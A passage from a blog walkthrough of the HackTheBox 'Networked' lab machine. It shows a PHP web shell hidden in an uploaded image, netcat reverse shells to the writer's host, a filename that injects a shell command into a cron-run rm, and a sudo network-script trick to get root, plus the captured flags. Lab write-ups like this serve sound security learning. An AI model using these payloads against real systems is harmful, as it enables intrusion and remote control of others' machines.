+</span></span><span style=display:flex><span>00000080: 3c62 <span style=color:#ae81ff>7220</span> 2f3e 0a3c <span style=color:#ae81ff>7072</span> 653e 3c3f <span style=color:#ae81ff>7068</span>  &lt;br /&gt;.&lt;pre&gt;&lt;?ph
+</span></span><span style=display:flex><span>00000090: <span style=color:#ae81ff>7020</span> <span style=color:#ae81ff>7061</span> <span style=color:#ae81ff>7373</span> <span style=color:#ae81ff>7468</span> <span style=color:#ae81ff>7275</span> <span style=color:#ae81ff>2824</span> 5f52 <span style=color:#ae81ff>4551</span>  p passthru<span style=color:#f92672>(</span>$_REQ
+</span></span><span style=display:flex><span>000000a0: <span style=color:#ae81ff>5545</span> <span style=color:#ae81ff>5354</span> 5b27 636d <span style=color:#ae81ff>6427</span> 5d2c <span style=color:#ae81ff>2024</span> <span style=color:#ae81ff>7265</span>  UEST<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;cmd&#39;</span><span style=color:#f92672>]</span>, $re
+</span></span><span style=display:flex><span>000000b0: <span style=color:#ae81ff>7375</span> 6c74 293b 203f 3e3c 2f70 <span style=color:#ae81ff>7265</span> 3e0a  sult<span style=color:#f92672>)</span>; ?&gt;&lt;/pre&gt;.
+</span></span></code></pre></div><p>We upload this file at <code>upload.php</code> and then go to the gallery at <code>photos.php</code>. There we find a broken image, which we can open (in a new tab) to access our web shell.</p><figure class=center><img src=/img/htb-networked-img4.png alt="Web Shell"><figcaption class=center>Web shell</figcaption></figure><p>As to not have to run every command from this web shell, we open a netcat listener on our device and make the target host connect to us.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># On our host</span>
+</span></span><span style=display:flex><span>$ nc -lvp <span style=color:#ae81ff>1337</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># In the web shell</span>
+</span></span><span style=display:flex><span>nc 10.10.15.192 <span style=color:#ae81ff>1337</span> -e /bin/bash
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Incoming connection</span>
+</span></span><span style=display:flex><span>10.10.10.146: inverse host lookup failed: Unknown host
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.15.192<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.10.146<span style=color:#f92672>]</span> <span style=color:#ae81ff>60570</span>
+</span></span><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Ctrl+Z (background this process)</span>
+</span></span><span style=display:flex><span>$ stty raw -echo
+</span></span><span style=display:flex><span>$ fg <span style=color:#75715e># Re-actve netcat process</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>bash-4.2$ export TERM<span style=color:#f92672>=</span>xterm <span style=color:#75715e># Prettify the shell (so I can use clear/Ctrl+L, etc)</span>
+</span></span><span style=display:flex><span>bash-4.2$ id
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>48<span style=color:#f92672>(</span>apache<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>We go to the home folder of the user, to try and find the user flag. Sadly enough it&rsquo;s not readable by the apache user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>bash-4.2$ ls /home
+</span></span><span style=display:flex><span>guly
+</span></span><span style=display:flex><span>bash-4.2$ ls /home/guly/
+</span></span><span style=display:flex><span>check_attack.php  crontab.guly  user.txt
+</span></span><span style=display:flex><span>bash-4.2$ ls -l /home/guly/
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>-r--r--r--. <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>782</span> Oct <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>2018</span> check_attack.php
+</span></span><span style=display:flex><span>-rw-r--r--  <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>44</span> Oct <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>2018</span> crontab.guly
+</span></span><span style=display:flex><span>-r--------. <span style=color:#ae81ff>1</span> guly guly  <span style=color:#ae81ff>33</span> Oct <span style=color:#ae81ff>30</span>  <span style=color:#ae81ff>2018</span> user.txt
+</span></span></code></pre></div><p>The crontab file seems to be worth having a look at.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>*/3 * * * * php /home/guly/check_attack.php
+</span></span></code></pre></div><p>Looks like it <code>check_attack.php</code> is executed every three minutes. Let&rsquo;s check that file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># [...]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$files <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_grep</span>(<span style=color:#e6db74>&#39;/^([^.])/&#39;</span>, <span style=color:#a6e22e>scandir</span>($path)); <span style=color:#75715e># Get files in dir ($path = /var/www/html/uploads/)
+</span></span></span><span style=display:flex><span><span style=color:#75715e># [...]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>list</span> ($name,$ext) <span style=color:#f92672>=</span> <span style=color:#a6e22e>getnameCheck</span>($value); <span style=color:#75715e># Call function that splits name and ext
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  $check <span style=color:#f92672>=</span> <span style=color:#a6e22e>check_ip</span>($name,$value); <span style=color:#75715e># Do a check on the name
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#75715e># If the check failed (first value in returned array is not true)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>($check[<span style=color:#ae81ff>0</span>])) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;attack!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>file_put_contents</span>($logpath, $msg, <span style=color:#a6e22e>FILE_APPEND</span> <span style=color:#f92672>|</span> <span style=color:#a6e22e>LOCK_EX</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;rm -f </span><span style=color:#e6db74>$logpath</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#75715e># Exec does OS commands
+</span></span></span><span style=display:flex><span><span style=color:#75715e># We can control the filename, so break out of the rm
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;nohup /bin/rm -f </span><span style=color:#e6db74>$path$value</span><span style=color:#e6db74> &gt; /dev/null 2&gt;&amp;1 &amp;&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;rm -f </span><span style=color:#e6db74>$path$value\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mail</span>($to, $msg, $msg, $headers, <span style=color:#e6db74>&#34;-F</span><span style=color:#e6db74>$value</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span><span style=color:#75715e># [...]
+</span></span></span></code></pre></div><p>This script also refers to <code>lib.php</code> for the check_ip method.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>check_ip</span>($prefix,$filename) {
+</span></span><span style=display:flex><span>  <span style=color:#75715e>//echo &#34;prefix: $prefix - fname: $filename&lt;br&gt;\n&#34;;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  $ret <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(<span style=color:#a6e22e>filter_var</span>($prefix, <span style=color:#a6e22e>FILTER_VALIDATE_IP</span>))) {
+</span></span><span style=display:flex><span>    $ret <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>    $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;4tt4ck on file &#34;</span><span style=color:#f92672>.</span>$filename<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;: prefix is not a valid ip &#34;</span>;
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    $msg <span style=color:#f92672>=</span> $filename;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>array</span>($ret,$msg);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Looks like we have to make a file with a filename that does not contain a valid IP, breaks out of the <code>exec(rm)</code> and executes a command that gives us access to the guly user.</p><p>Let&rsquo;s create a file that opens a netcat connection again.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># On our side</span>
+</span></span><span style=display:flex><span>$ nc -lvp <span style=color:#ae81ff>1338</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1338</span> ...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Target side</span>
+</span></span><span style=display:flex><span>bash-4.2$ cd /var/www/html/uploads/
+</span></span><span style=display:flex><span>bash-4.2$ touch <span style=color:#e6db74>&#39;; nc -v 10.10.15.192 1338 -e $(which bash)&#39;</span> <span style=color:#75715e># I use which because filename cannot contain /</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># This would also work:</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># touch &#39;; nc -c bash -v 10.10.15.192 1338&#39;</span>
+</span></span></code></pre></div><h3 id=weve-got-the-user-flag>We&rsquo;ve got the user flag</h3><p>A minute or two (max three, remember the cronjob) later, we get a netcat connection with shell access as the guly user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ nc -lvp <span style=color:#ae81ff>1338</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1338</span> ...
+</span></span><span style=display:flex><span>10.10.10.146: inverse host lookup failed: Unknown host
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.15.192<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.10.146<span style=color:#f92672>]</span> <span style=color:#ae81ff>60570</span>
+</span></span><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>guly@networked ~<span style=color:#f92672>]</span>$ whoami
+</span></span><span style=display:flex><span>whoami
+</span></span><span style=display:flex><span>guly
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>guly@networked ~<span style=color:#f92672>]</span>$ cat user.txt
+</span></span><span style=display:flex><span>526cfc2305f17faaacecf212c57d71c5
+</span></span></code></pre></div><h2 id=get-root>Get root</h2><p>We check to see if the guly user can execute anything as sudo/root and we find 1 script which can be executed by guly.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>guly@networked ~<span style=color:#f92672>]</span>$ sudo -l
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> guly on networked:
+</span></span><span style=display:flex><span>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+</span></span><span style=display:flex><span>    env_reset, env_keep<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>,
+</span></span><span style=display:flex><span>    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>,
+</span></span><span style=display:flex><span>    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>,
+</span></span><span style=display:flex><span>    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>,
+</span></span><span style=display:flex><span>    env_keep<span style=color:#f92672>+=</span><span style=color:#e6db74>&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>,
+</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User guly may run the following commands on networked:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/local/sbin/changename.sh
+</span></span></code></pre></div><p>We can&rsquo;t modify the file, so we&rsquo;ll need to find a way to abuse it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>guly@networked ~<span style=color:#f92672>]</span>$ ls -l /usr/local/sbin/changename.sh
+</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>422</span> Jul  <span style=color:#ae81ff>8</span> 12:34 /usr/local/sbin/changename.sh
+</span></span></code></pre></div><p>Note that this script is used to source variables to a network script. There&rsquo;s a vulnerability here that if you include a space in any of the variables, the code appended after that space will be executed.<br>See this <a href=https://seclists.org/fulldisclosure/2019/Apr/24%22 target=_blank>mail thread</a> for more info.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash -p
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly <span style=color:#e6db74>&lt;&lt; EoF
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>DEVICE=guly0
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ONBOOT=no
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NM_CONTROLLED=no
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>EoF</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Input must only contain alphanumeric, underscore, space, slash or dash</span>
+</span></span><span style=display:flex><span>regexp<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;^[a-zA-Z0-9_\ /-]+</span>$<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;interface </span>$var<span style=color:#e6db74>:&#34;</span>
+</span></span><span style=display:flex><span>        read x
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> <span style=color:#f92672>[[</span> ! $x <span style=color:#f92672>=</span>~ $regexp <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>                echo <span style=color:#e6db74>&#34;wrong input, try again&#34;</span>
+</span></span><span style=display:flex><span>                echo <span style=color:#e6db74>&#34;interface </span>$var<span style=color:#e6db74>:&#34;</span>
+</span></span><span style=display:flex><span>                read x
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># $x will be read</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Including a space in the variable, will cause command execution</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># e.g. $test=&#34;test&#34; echo &#34;hi&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#      hi</span>
+</span></span><span style=display:flex><span>        echo $var<span style=color:#f92672>=</span>$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>/sbin/ifup guly0
+</span></span></code></pre></div><p>So we run the script, using sudo, and pass a command in one of the variables.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>guly@networked ~<span style=color:#f92672>]</span>$ sudo /usr/local/sbin/changename.sh
+</span></span><span style=display:flex><span>interface NAME:
+</span></span><span style=display:flex><span>iface
+</span></span><span style=display:flex><span>interface PROXY_METHOD:
+</span></span><span style=display:flex><span>proxy
+</span></span><span style=display:flex><span>interface BROWSER_ONLY:
+</span></span><span style=display:flex><span>browser
+</span></span><span style=display:flex><span>interface BOOTPROTO:
+</span></span><span style=display:flex><span>proto bash
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@networked network-scripts<span style=color:#f92672>]</span><span style=color:#75715e># whoami</span>
+</span></span><span style=display:flex><span>root
+</span></span></code></pre></div><h3 id=got-the-root-flag>Got the root flag</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>root@networked network-scripts<span style=color:#f92672>]</span><span style=color:#75715e># cat /root/root.txt</span>
+</span></span><span style=display:flex><span>0a8ecda83f1d81251099e8ac3d0dcb82
+</span></span></code></pre></div><p>It took me some time to find the right filename for getting the guly user and have a script in the sudoers file was definitely a nice touch. Really like this box.</p><p>Kudos to guly!</p><hr><div class=footer><a class=previous-post href="https://dev.sequr.be/blog/hackthebox/challenge/hackthebox-crookedcrockford/?ref=footer"><span style=font-weight:700>« Previous</span><br>Crooked Crockford</a><div class=next-post><a href="https://dev.sequr.be/blog/hackthebox/challenge/hackthebox-freelancer/?ref=footer"><span style=font-weight:700>Next »</span><br>FreeLancer</a></div></div></div></main><div class=article-toc><div class=toc-wrapper><h4 id=contents></h4><nav id=TableOfContents><ul><li><a href=#machine-info>Machine info</a></li><li><a href=#recon>Recon</a><ul><li><a href=#nmap>Nmap</a></li></ul></li><li><a href=#get-user>Get user</a><ul><li><a href=#weve-got-the-user-flag>We&rsquo;ve got the user flag</a></li></ul></li><li><a href=#get-root>Get root</a><ul><li><a href=#got-the-root-flag>Got the root flag</a></li></ul></li></ul></nav></div></div></div></body></html>
